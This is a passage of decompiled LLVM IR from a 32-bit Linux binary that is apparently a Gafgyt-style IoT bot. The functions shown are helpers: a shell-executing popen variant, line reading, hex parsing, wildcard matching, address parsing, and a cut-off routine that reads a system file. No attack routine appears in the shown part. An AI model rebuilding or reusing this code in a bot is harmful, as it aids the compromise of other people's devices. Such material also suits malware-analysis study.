  %v2_8048a7b = call i32 @__libc_close(i32 %v3_8048a75)
  %v2_8048a86 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b83

dec_label_pc_8048a97:                             ; preds = %dec_label_pc_8048a6a
  br i1 %v1_8048a9f, label %dec_label_pc_8048ad4, label %dec_label_pc_8048aa1

dec_label_pc_8048aa1:                             ; preds = %dec_label_pc_8048a97
  %v9_8048aa4 = icmp eq i32 %tmp7, 1
  br i1 %v9_8048aa4, label %dec_label_pc_8048ac7, label %dec_label_pc_8048aa9

dec_label_pc_8048aa9:                             ; preds = %dec_label_pc_8048aa1
  %v4_8048ab7 = call i32 @dup2(i32 %tmp7, i32 1)
  %v2_8048ac2 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048ac7

dec_label_pc_8048ac7:                             ; preds = %dec_label_pc_8048aa1, %dec_label_pc_8048aa9
  %v3_8048ac7 = load i32, i32* %stack_var_-24, align 4
  %v2_8048acd = call i32 @__libc_close(i32 %v3_8048ac7)
  br label %dec_label_pc_8048b04

dec_label_pc_8048ad4:                             ; preds = %dec_label_pc_8048a97
  %v3_8048ad4 = load i32, i32* %stack_var_-24, align 4
  %v1_8048ad7 = icmp eq i32 %v3_8048ad4, 0
  br i1 %v1_8048ad7, label %dec_label_pc_8048af9, label %dec_label_pc_8048adb

dec_label_pc_8048adb:                             ; preds = %dec_label_pc_8048ad4
  %v4_8048ae9 = call i32 @dup2(i32 %v3_8048ad4, i32 0)
  %v3_8048aee = load i32, i32* %stack_var_-24, align 4
  %v2_8048af4 = call i32 @__libc_close(i32 %v3_8048aee)
  br label %dec_label_pc_8048af9

dec_label_pc_8048af9:                             ; preds = %dec_label_pc_8048ad4, %dec_label_pc_8048adb
  %v2_8048aff = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b04

dec_label_pc_8048b04:                             ; preds = %dec_label_pc_8048ac7, %dec_label_pc_8048af9
  %v8_8048b2a = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_8058c9a.16 to i32), i32 ptrtoint ([3 x i8]* @global_var_8058c97.15 to i32), i32 ptrtoint ([3 x i8]* @global_var_8058c94.14 to i32), i32 %arg1, i32 0)
  %v2_8048b36 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048b3b:                             ; preds = %dec_label_pc_8048a6a
  br i1 %v1_8048a9f, label %dec_label_pc_8048b58, label %dec_label_pc_8048b45

dec_label_pc_8048b45:                             ; preds = %dec_label_pc_8048b3b
  %v3_8048b45 = load i32, i32* %stack_var_-24, align 4
  %v2_8048b51 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b69

dec_label_pc_8048b58:                             ; preds = %dec_label_pc_8048b3b
  %v3_8048b5e = load i32, i32* %stack_var_-24, align 4
  %v2_8048b64 = call i32 @__libc_close(i32 %v3_8048b5e)
  br label %dec_label_pc_8048b69

dec_label_pc_8048b69:                             ; preds = %dec_label_pc_8048b45, %dec_label_pc_8048b58
  %stack_var_-28.0 = phi i32 [ %tmp7, %dec_label_pc_8048b58 ], [ %v3_8048b45, %dec_label_pc_8048b45 ]
  %v2_8048b6c = mul i32 %stack_var_-28.0, 4
  %v0_8048b71 = load i8*, i8** @global_var_80624a0.13, align 4
  %v1_8048b71 = ptrtoint i8* %v0_8048b71 to i32
  %v2_8048b76 = add i32 %v1_8048b71, %v2_8048b6c
  %v2_8048b7b = inttoptr i32 %v2_8048b76 to i32*
  store i32 %v1_8048a56, i32* %v2_8048b7b, align 4
  br label %dec_label_pc_8048b83

dec_label_pc_8048b83:                             ; preds = %dec_label_pc_8048a16, %dec_label_pc_80489fc, %dec_label_pc_80489d8, %dec_label_pc_80489b7, %dec_label_pc_80489c1, %dec_label_pc_8048a75, %dec_label_pc_8048b69
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_8048a75 ], [ %stack_var_-28.0, %dec_label_pc_8048b69 ], [ -1, %dec_label_pc_80489c1 ], [ -1, %dec_label_pc_80489b7 ], [ -1, %dec_label_pc_80489d8 ], [ -1, %dec_label_pc_80489fc ], [ -1, %dec_label_pc_8048a16 ]
  %v2_8048b89 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048b89, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v1_8048a56, { 1, 2, 0 }
  uselistorder i32 %v1_80489fc, { 2, 0, 1 }
  uselistorder i32 %tmp11, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 6, 5, 4, 3, 0, 2 }
  uselistorder i8* %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048b83, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048b69, { 1, 0 }
  uselistorder label %dec_label_pc_8048b04, { 1, 0 }
  uselistorder label %dec_label_pc_8048af9, { 1, 0 }
  uselistorder label %dec_label_pc_8048ac7, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048b8c = load i32, i32* @ebp, align 4
  store i32 %v0_8048b8c, i32* %stack_var_-4, align 4
  %v0_8048b95 = load i8*, i8** @global_var_80624a0.13, align 4
  %v2_8048b9a = icmp eq i8* %v0_8048b95, null
  br i1 %v2_8048b9a, label %dec_label_pc_8048cf9, label %dec_label_pc_8048b9e

dec_label_pc_8048b9e:                             ; preds = %entry
  %v1_8048b95 = ptrtoint i8* %v0_8048b95 to i32
  %v2_8048ba1 = mul i32 %arg1, 4
  %v2_8048bab = add i32 %v1_8048b95, %v2_8048ba1
  %v1_8048bae = inttoptr i32 %v2_8048bab to i32*
  %v2_8048bae = load i32, i32* %v1_8048bae, align 4
  %v1_8048bb0 = icmp eq i32 %v2_8048bae, 0
  %v1_8048bb2 = icmp eq i1 %v1_8048bb0, false
  br i1 %v1_8048bb2, label %dec_label_pc_8048bc3, label %dec_label_pc_8048cf9

dec_label_pc_8048bc3:                             ; preds = %dec_label_pc_8048b9e
  %v1_8048bc9 = call i32 @__libc_close(i32 %arg1)
  %v2_8048bce = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048bd7 = call i32 @sigemptyset(i32 %v2_8048bce)
  %v2_8048bed = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 2)
  %v2_8048c03 = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 3)
  %v2_8048c19 = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 1)
  %v4_8048c24 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048c39 = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048c39 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048c39, i32 %v4_8048c24)
  %v2_8048c58 = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048c3e

dec_label_pc_8048c3e:                             ; preds = %dec_label_pc_8048c79, %dec_label_pc_8048bc3
  %v0_8048c46 = load i8*, i8** @global_var_80624a0.13, align 4
  %v1_8048c46 = ptrtoint i8* %v0_8048c46 to i32
  %v2_8048c4b = add i32 %v1_8048c46, %v2_8048ba1
  %v1_8048c4e = inttoptr i32 %v2_8048c4b to i32*
  %v2_8048c4e = load i32, i32* %v1_8048c4e, align 4
  %v3_8048c65 = call i32 @__libc_waitpid(i32 %v2_8048c4e, i32 %v2_8048c58, i32 0)
  %v13_8048c70 = icmp eq i32 %v3_8048c65, -1
  %v1_8048c77 = icmp eq i1 %v13_8048c70, false
  br i1 %v1_8048c77, label %dec_label_pc_8048c85, label %dec_label_pc_8048c79

dec_label_pc_8048c79:                             ; preds = %dec_label_pc_8048c3e
  %v1_8048c79 = call i32 @__errno_location(i32 %v3_8048c65)
  %v1_8048c7e = inttoptr i32 %v1_8048c79 to i32*
  %v2_8048c7e = load i32, i32* %v1_8048c7e, align 4
  %v9_8048c80 = icmp eq i32 %v2_8048c7e, 4
  br i1 %v9_8048c80, label %dec_label_pc_8048c3e, label %dec_label_pc_8048c85

dec_label_pc_8048c85:                             ; preds = %dec_label_pc_8048c79, %dec_label_pc_8048c3e
  %v13_8048c70.lcssa = phi i1 [ true, %dec_label_pc_8048c79 ], [ false, %dec_label_pc_8048c3e ]
  %v3_8048c9e = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048c9e = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048c9e, i32 0)
  %v2_8048ca9 = mul i32 %tmp6, 4
  %v0_8048cae = load i8*, i8** @global_var_80624a0.13, align 4
  %v1_8048cae = ptrtoint i8* %v0_8048cae to i32
  %v2_8048cb3 = add i32 %v1_8048cae, %v2_8048ca9
  %v1_8048cb6 = inttoptr i32 %v2_8048cb3 to i32*
  store i32 0, i32* %v1_8048cb6, align 4
  br i1 %v13_8048c70.lcssa, label %dec_label_pc_8048ced, label %dec_label_pc_8048cc5

dec_label_pc_8048cc5:                             ; preds = %dec_label_pc_8048c85
  %v3_8048cc5 = load i32, i32* %stack_var_-268, align 4
  %v1_8048cd1 = and i32 %v3_8048cc5, 65280
  %v2_8048cd81 = udiv i32 %v1_8048cd1, 256
  br label %dec_label_pc_8048ced

dec_label_pc_8048ced:                             ; preds = %dec_label_pc_8048c85, %dec_label_pc_8048cc5
  %storemerge2 = phi i32 [ %v2_8048cd81, %dec_label_pc_8048cc5 ], [ -1, %dec_label_pc_8048c85 ]
  %v2_8048cff.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048cf9

dec_label_pc_8048cf9:                             ; preds = %entry, %dec_label_pc_8048b9e, %dec_label_pc_8048ced
  %v2_8048cff = phi i32 [ %v2_8048cff.pre, %dec_label_pc_8048ced ], [ %v0_8048b8c, %dec_label_pc_8048b9e ], [ %v0_8048b8c, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048ced ], [ -1, %dec_label_pc_8048b9e ], [ -1, %entry ]
  store i32 %v2_8048cff, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048c65, { 1, 0 }
  uselistorder i32 %v2_8048ba1, { 1, 0 }
  uselistorder i8* %v0_8048b95, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_80624a0.13, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048cf9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048ced, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048d40

dec_label_pc_8048d17:                             ; preds = %dec_label_pc_8048d48
  %v3_8048d2f = inttoptr i32 %v5_8048d4b to i32*
  %v4_8048d2f = call i32 @__libc_read(i32 %arg3, i32* %v3_8048d2f, i32 1)
  %v4_8048d37 = add nuw i32 %storemerge113, 1
  %v8_8048d3a = icmp eq i32 %v4_8048d2f, 0
  %v12_8048d3a = icmp eq i32 %v4_8048d2f, 1
  %v1_8048d3e = icmp eq i1 %v12_8048d3a, false
  br i1 %v1_8048d3e, label %dec_label_pc_8048d56, label %dec_label_pc_8048d40

dec_label_pc_8048d40:                             ; preds = %entry, %dec_label_pc_8048d17
  %v8_8048d3a14 = phi i1 [ false, %entry ], [ %v8_8048d3a, %dec_label_pc_8048d17 ]
  %storemerge113 = phi i32 [ 0, %entry ], [ %v4_8048d37, %dec_label_pc_8048d17 ]
  %v5_8048d46 = icmp slt i32 %storemerge113, %arg2
  br i1 %v5_8048d46, label %dec_label_pc_8048d48, label %dec_label_pc_8048d56

dec_label_pc_8048d48:                             ; preds = %dec_label_pc_8048d40
  %v5_8048d4b = add i32 %storemerge113, %arg1
  %v1_8048d4e = add i32 %v5_8048d4b, -1
  %v1_8048d4f = inttoptr i32 %v1_8048d4e to i8*
  %v2_8048d4f = load i8, i8* %v1_8048d4f, align 1
  %v10_8048d52 = icmp eq i8 %v2_8048d4f, 10
  %v1_8048d54 = icmp eq i1 %v10_8048d52, false
  br i1 %v1_8048d54, label %dec_label_pc_8048d17, label %dec_label_pc_8048d56

dec_label_pc_8048d56:                             ; preds = %dec_label_pc_8048d40, %dec_label_pc_8048d48, %dec_label_pc_8048d17
  %v8_8048d3a.lcssa = phi i1 [ %v8_8048d3a14, %dec_label_pc_8048d40 ], [ %v8_8048d3a14, %dec_label_pc_8048d48 ], [ %v8_8048d3a, %dec_label_pc_8048d17 ]
  br i1 %v8_8048d3a.lcssa, label %dec_label_pc_8048d6b, label %dec_label_pc_8048d5c

dec_label_pc_8048d5c:                             ; preds = %dec_label_pc_8048d56
  br label %dec_label_pc_8048d6b

dec_label_pc_8048d6b:                             ; preds = %dec_label_pc_8048d56, %dec_label_pc_8048d5c
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048d5c ], [ 0, %dec_label_pc_8048d56 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048d4b, { 1, 0 }
  uselistorder i32 %storemerge113, { 2, 0, 1 }
  uselistorder i1 %v8_8048d3a14, { 1, 0 }
  uselistorder i1 %v8_8048d3a, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048d6b, { 1, 0 }
  uselistorder label %dec_label_pc_8048d56, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048d40, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048d9f1 = ptrtoint i8* %arg1 to i32
  %v2_8048da22 = load i8, i8* %arg1, align 1
  %v4_8048da54 = icmp eq i8 %v2_8048da22, 0
  br i1 %v4_8048da54, label %dec_label_pc_8048daf, label %dec_label_pc_8048da9

dec_label_pc_8048d7f:                             ; preds = %dec_label_pc_8048da9
  %v2_8048d84 = mul i32 %stack_var_-8.010, 16
  %v2_8048d8a = load i8, i8* %stack_var_4.011, align 1
  %v3_8048d8a = zext i8 %v2_8048d8a to i32
  %v1_8048d90 = mul nuw nsw i32 %v3_8048d8a, 4
  %v2_8048d90 = add i32 %v1_8048d90, ptrtoint (i32* @global_var_8058cc0.17 to i32)
  %v3_8048d90 = inttoptr i32 %v2_8048d90 to i32*
  %v4_8048d90 = load i32, i32* %v3_8048d90, align 4
  %v2_8048d97 = or i32 %v4_8048d90, %v2_8048d84
  %v5_8048d9c = add i32 %v4_8048d9f12, 1
  %v22_8048d9c = inttoptr i32 %v5_8048d9c to i8*
  %v2_8048da2 = load i8, i8* %v22_8048d9c, align 1
  %v4_8048da5 = icmp eq i8 %v2_8048da2, 0
  br i1 %v4_8048da5, label %dec_label_pc_8048daf, label %dec_label_pc_8048da9

dec_label_pc_8048da9:                             ; preds = %entry, %dec_label_pc_8048d7f
  %v4_8048d9f12 = phi i32 [ %v5_8048d9c, %dec_label_pc_8048d7f ], [ %v4_8048d9f1, %entry ]
  %stack_var_4.011 = phi i8* [ %v22_8048d9c, %dec_label_pc_8048d7f ], [ %arg1, %entry ]
  %stack_var_-8.010 = phi i32 [ %v2_8048d97, %dec_label_pc_8048d7f ], [ 0, %entry ]
  %v5_8048da9 = icmp slt i32 %stack_var_-8.010, 0
  %v1_8048dad = icmp eq i1 %v5_8048da9, false
  br i1 %v1_8048dad, label %dec_label_pc_8048d7f, label %dec_label_pc_8048daf

dec_label_pc_8048daf:                             ; preds = %dec_label_pc_8048d7f, %dec_label_pc_8048da9, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %v2_8048d97, %dec_label_pc_8048d7f ], [ %stack_var_-8.010, %dec_label_pc_8048da9 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.010, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048daf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048da9, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp13 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048db7 = load i32, i32* @ebx, align 4
  store i32 %v0_8048db7, i32* %stack_var_-8, align 4
  %v4_8048dbb = ptrtoint i8* %arg1 to i32
  %v2_8048dbe = load i8, i8* %arg1, align 1
  %v12_8048dc7 = icmp eq i8 %v2_8048dbe, 42
  br i1 %v12_8048dc7, label %dec_label_pc_8048def, label %dec_label_pc_8048dcd

dec_label_pc_8048dcd:                             ; preds = %entry
  %v12_8048dcd = icmp eq i8 %v2_8048dbe, 63
  br i1 %v12_8048dcd, label %dec_label_pc_8048e42, label %dec_label_pc_8048dd3

dec_label_pc_8048dd3:                             ; preds = %dec_label_pc_8048dcd
  %v4_8048dd3 = icmp eq i8 %v2_8048dbe, 0
  br i1 %v4_8048dd3, label %dec_label_pc_8048dde, label %dec_label_pc_8048e7c

dec_label_pc_8048dde:                             ; preds = %dec_label_pc_8048dd3
  %v2_8048de1 = load i8, i8* %tmp13, align 1
  %v3_8048de1 = zext i8 %v2_8048de1 to i32
  br label %dec_label_pc_8048ed2

dec_label_pc_8048def:                             ; preds = %entry
  %v1_8048df2 = add i32 %v4_8048dbb, 1
  %v4_8048dfa = inttoptr i32 %v1_8048df2 to i8*
  %v5_8048dfd = call i32 @wildString(i8* %v4_8048dfa, i32 %arg2)
  %v1_8048e02 = icmp eq i32 %v5_8048dfd, 0
  br i1 %v1_8048e02, label %dec_label_pc_8048e30, label %dec_label_pc_8048e06

dec_label_pc_8048e06:                             ; preds = %dec_label_pc_8048def
  %v2_8048e09 = load i8, i8* %tmp13, align 1
  %v4_8048e0c = icmp eq i8 %v2_8048e09, 0
  br i1 %v4_8048e0c, label %dec_label_pc_8048e37, label %dec_label_pc_8048e10

dec_label_pc_8048e10:                             ; preds = %dec_label_pc_8048e06
  %v1_8048e13 = add i32 %arg2, 1
  %v5_8048e1e = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048e13)
  %v1_8048e23 = icmp eq i32 %v5_8048e1e, 0
  br i1 %v1_8048e23, label %dec_label_pc_8048e30, label %dec_label_pc_8048e37

dec_label_pc_8048e30:                             ; preds = %dec_label_pc_8048e10, %dec_label_pc_8048def
  br label %dec_label_pc_8048e37

dec_label_pc_8048e37:                             ; preds = %dec_label_pc_8048e06, %dec_label_pc_8048e10, %dec_label_pc_8048e30
  %storemerge6 = phi i32 [ 0, %dec_label_pc_8048e30 ], [ 1, %dec_label_pc_8048e10 ], [ 1, %dec_label_pc_8048e06 ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048e42:                             ; preds = %dec_label_pc_8048dcd
  %v2_8048e45 = load i8, i8* %tmp13, align 1
  %v4_8048e48 = icmp eq i8 %v2_8048e45, 0
  br i1 %v4_8048e48, label %dec_label_pc_8048e74, label %dec_label_pc_8048e4c

dec_label_pc_8048e4c:                             ; preds = %dec_label_pc_8048e42
  %v1_8048e4f = add i32 %arg2, 1
  %v1_8048e53 = add i32 %v4_8048dbb, 1
  %v4_8048e58 = inttoptr i32 %v1_8048e53 to i8*
  %v5_8048e5b = call i32 @wildString(i8* %v4_8048e58, i32 %v1_8048e4f)
  %v1_8048e60 = icmp ne i32 %v5_8048e5b, 0
  %. = zext i1 %v1_8048e60 to i32
  br label %dec_label_pc_8048e74

dec_label_pc_8048e74:                             ; preds = %dec_label_pc_8048e4c, %dec_label_pc_8048e42
  %storemerge5 = phi i32 [ 1, %dec_label_pc_8048e42 ], [ %., %dec_label_pc_8048e4c ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048e7c:                             ; preds = %dec_label_pc_8048dd3
  %v2_8048e7f = load i8, i8* %arg1, align 1
  %v3_8048e7f = zext i8 %v2_8048e7f to i32
  %v2_8048e88 = call i32 @__GI_toupper(i32 %v3_8048e7f)
  store i32 %v2_8048e88, i32* @ebx, align 4
  %v2_8048e92 = load i8, i8* %tmp13, align 1
  %v3_8048e92 = zext i8 %v2_8048e92 to i32
  %v2_8048e9b = call i32 @__GI_toupper(i32 %v3_8048e92)
  %v0_8048ea0 = load i32, i32* @ebx, align 4
  %v12_8048ea0 = icmp eq i32 %v0_8048ea0, %v2_8048e9b
  %v1_8048ea2 = icmp eq i1 %v12_8048ea0, false
  br i1 %v1_8048ea2, label %dec_label_pc_8048ecc, label %dec_label_pc_8048ea4

dec_label_pc_8048ea4:                             ; preds = %dec_label_pc_8048e7c
  %v1_8048ea7 = add i32 %arg2, 1
  %v1_8048eab = add i32 %v4_8048dbb, 1
  %v4_8048eb0 = inttoptr i32 %v1_8048eab to i8*
  %v5_8048eb3 = call i32 @wildString(i8* %v4_8048eb0, i32 %v1_8048ea7)
  %v1_8048eb8 = icmp ne i32 %v5_8048eb3, 0
  %.7 = zext i1 %v1_8048eb8 to i32
  br label %dec_label_pc_8048ecc

dec_label_pc_8048ecc:                             ; preds = %dec_label_pc_8048ea4, %dec_label_pc_8048e7c
  %storemerge = phi i32 [ 1, %dec_label_pc_8048e7c ], [ %.7, %dec_label_pc_8048ea4 ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048ed2:                             ; preds = %dec_label_pc_8048e74, %dec_label_pc_8048e37, %dec_label_pc_8048dde, %dec_label_pc_8048ecc
  %stack_var_-24.0 = phi i32 [ %storemerge6, %dec_label_pc_8048e37 ], [ %storemerge5, %dec_label_pc_8048e74 ], [ %v3_8048de1, %dec_label_pc_8048dde ], [ %storemerge, %dec_label_pc_8048ecc ]
  %v2_8048ed8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048ed8, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048dbe, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048ed2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048e37, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_8048edb = load i32, i32* @ebp, align 4
  %v1_8048ee7 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048ee7, i32* %arg2, align 4
  %v10_8048ef8 = icmp eq i32 %v1_8048ee7, -1
  %. = zext i1 %v10_8048ef8 to i32
  store i32 %v0_8048edb, i32* @ebp, align 4
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048f12 = load i32, i32* @ebp, align 4
  store i32 %v0_8048f12, i32* %stack_var_-4, align 4
  %v4_8048f354 = ptrtoint i8* %arg1 to i32
  %v2_8048f385 = load i8, i8* %arg1, align 1
  %v4_8048f3b7 = icmp eq i8 %v2_8048f385, 0
  %v1_8048f3d9 = icmp eq i1 %v4_8048f3b7, false
  br i1 %v1_8048f3d9, label %dec_label_pc_8048f1a, label %dec_label_pc_8048f3f

dec_label_pc_8048f1a:                             ; preds = %entry, %dec_label_pc_8048f1a
  %v4_8048f3511 = phi i32 [ %v5_8048f32, %dec_label_pc_8048f1a ], [ %v4_8048f354, %entry ]
  %stack_var_4.010 = phi i8* [ %v22_8048f32, %dec_label_pc_8048f1a ], [ %arg1, %entry ]
  %v2_8048f1d = load i8, i8* %stack_var_4.010, align 1
  %v3_8048f1d = zext i8 %v2_8048f1d to i32
  %v1_8048f26 = call i32 @__GI_toupper(i32 %v3_8048f1d)
  %v1_8048f30 = trunc i32 %v1_8048f26 to i8
  store i8 %v1_8048f30, i8* %stack_var_4.010, align 1
  %v5_8048f32 = add i32 %v4_8048f3511, 1
  %v22_8048f32 = inttoptr i32 %v5_8048f32 to i8*
  %v2_8048f38 = load i8, i8* %v22_8048f32, align 1
  %v4_8048f3b = icmp eq i8 %v2_8048f38, 0
  %v1_8048f3d = icmp eq i1 %v4_8048f3b, false
  br i1 %v1_8048f3d, label %dec_label_pc_8048f1a, label %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge

dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge: ; preds = %dec_label_pc_8048f1a
  %v2_8048f3f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048f3f

dec_label_pc_8048f3f:                             ; preds = %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge, %entry
  %v2_8048f3f = phi i32 [ %v2_8048f3f.pre, %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge ], [ %v0_8048f12, %entry ]
  %v3_8048f38.lcssa.in = phi i8 [ %v2_8048f38, %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge ], [ %v2_8048f385, %entry ]
  %v3_8048f38.lcssa = zext i8 %v3_8048f38.lcssa.in to i32
  store i32 %v2_8048f3f, i32* @ebp, align 4
  ret i32 %v3_8048f38.lcssa

; uselistorder directives
  uselistorder i8* %v22_8048f32, { 1, 0 }
  uselistorder i32 %v5_8048f32, { 1, 0 }
  uselistorder i8* %stack_var_4.010, { 1, 0 }
  uselistorder label %dec_label_pc_8048f1a, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v5_8048f5a = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80590c0.18, i32 0, i32 0), i32 0)
  %v2_80490ba = ptrtoint i32* %stack_var_-4112 to i32
  %tmp22 = bitcast i32* %stack_var_-4112 to i8*
  %v5_80490d224 = call i32 @fdgets(i32 %v2_80490ba, i32 4096, i32 %v5_8048f5a)
  %v1_80490d725 = icmp eq i32 %v5_80490d224, 0
  %v1_80490d927 = icmp eq i1 %v1_80490d725, false
  br i1 %v1_80490d927, label %dec_label_pc_8048f67, label %dec_label_pc_80490df

dec_label_pc_8048f67:                             ; preds = %entry, %dec_label_pc_8049099
  %v3_8048f70 = call i32 @uppercase(i8* %tmp22)
  %v5_8048f86 = call i32 @strstr(i32 %v2_80490ba, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80590ce.19, i32 0, i32 0))
  %v12_8048f93 = icmp eq i32 %v5_8048f86, %v2_80490ba
  %v1_8048f95 = icmp eq i1 %v12_8048f93, false
  br i1 %v1_8048f95, label %dec_label_pc_8049099, label %dec_label_pc_8048f9b

dec_label_pc_8048f9b:                             ; preds = %dec_label_pc_8048f67
  %tmp23 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_8048fac

dec_label_pc_8048fa9:                             ; preds = %dec_label_pc_8048fc0, %dec_label_pc_8048fb6, %dec_label_pc_8048fac
  %v5_8048fa9 = add i32 %v4_8048fac, 1
  %v22_8048fa9 = inttoptr i32 %v5_8048fa9 to i8*
  br label %dec_label_pc_8048fac

dec_label_pc_8048fac:                             ; preds = %dec_label_pc_8048f9b, %dec_label_pc_8048fa9
  %storemerge4 = phi i8* [ %v22_8048fa9, %dec_label_pc_8048fa9 ], [ %tmp23, %dec_label_pc_8048f9b ]
  %v4_8048fac = ptrtoint i8* %storemerge4 to i32
  %v2_8048faf = load i8, i8* %storemerge4, align 1
  %v7_8048fb2 = icmp eq i8 %v2_8048faf, 32
  br i1 %v7_8048fb2, label %dec_label_pc_8048fa9, label %dec_label_pc_8048fb6

dec_label_pc_8048fb6:                             ; preds = %dec_label_pc_8048fac
  %v2_8048fb9 = load i8, i8* %storemerge4, align 1
  %v10_8048fbc = icmp eq i8 %v2_8048fb9, 9
  br i1 %v10_8048fbc, label %dec_label_pc_8048fa9, label %dec_label_pc_8048fc0

dec_label_pc_8048fc0:                             ; preds = %dec_label_pc_8048fb6
  %v2_8048fc3 = load i8, i8* %storemerge4, align 1
  %v10_8048fc6 = icmp eq i8 %v2_8048fc3, 58
  br i1 %v10_8048fc6, label %dec_label_pc_8048fa9, label %dec_label_pc_8048ff1.preheader

dec_label_pc_8048ff1.preheader:                   ; preds = %dec_label_pc_8048fc0
  br label %dec_label_pc_8048ff1

dec_label_pc_8048fcc:                             ; preds = %dec_label_pc_804901a, %dec_label_pc_8048ff1
  %v3_8048fe3 = call i32 @_strlen(i8* %storemerge4)
  %v6_8048fea = add i32 %v4_8048fac, %v3_8048fe3
  %v1_8048fed = add i32 %v6_8048fea, -1
  %v1_8048fee = inttoptr i32 %v1_8048fed to i8*
  store i8 0, i8* %v1_8048fee, align 1
  br label %dec_label_pc_8048ff1

dec_label_pc_8048ff1:                             ; preds = %dec_label_pc_8048ff1.preheader, %dec_label_pc_8048fcc
  %v3_8049008 = call i32 @_strlen(i8* %storemerge4)
  %v6_804900f = add i32 %v4_8048fac, %v3_8049008
  %v1_8049012 = add i32 %v6_804900f, -1
  %v1_8049013 = inttoptr i32 %v1_8049012 to i8*
  %v2_8049013 = load i8, i8* %v1_8049013, align 1
  %v10_8049016 = icmp eq i8 %v2_8049013, 13
  br i1 %v10_8049016, label %dec_label_pc_8048fcc, label %dec_label_pc_804901a

dec_label_pc_804901a:                             ; preds = %dec_label_pc_8048ff1
  store i1 false, i1* @df, align 1
  store i32 %v4_8048fac, i32* @edi, align 4
  %v3_8049031 = call i32 @_strlen(i8* %storemerge4)
  %v6_8049038 = add i32 %v4_8048fac, %v3_8049031
  %v1_804903b = add i32 %v6_8049038, -1
  %v1_804903c = inttoptr i32 %v1_804903b to i8*
  %v2_804903c = load i8, i8* %v1_804903c, align 1
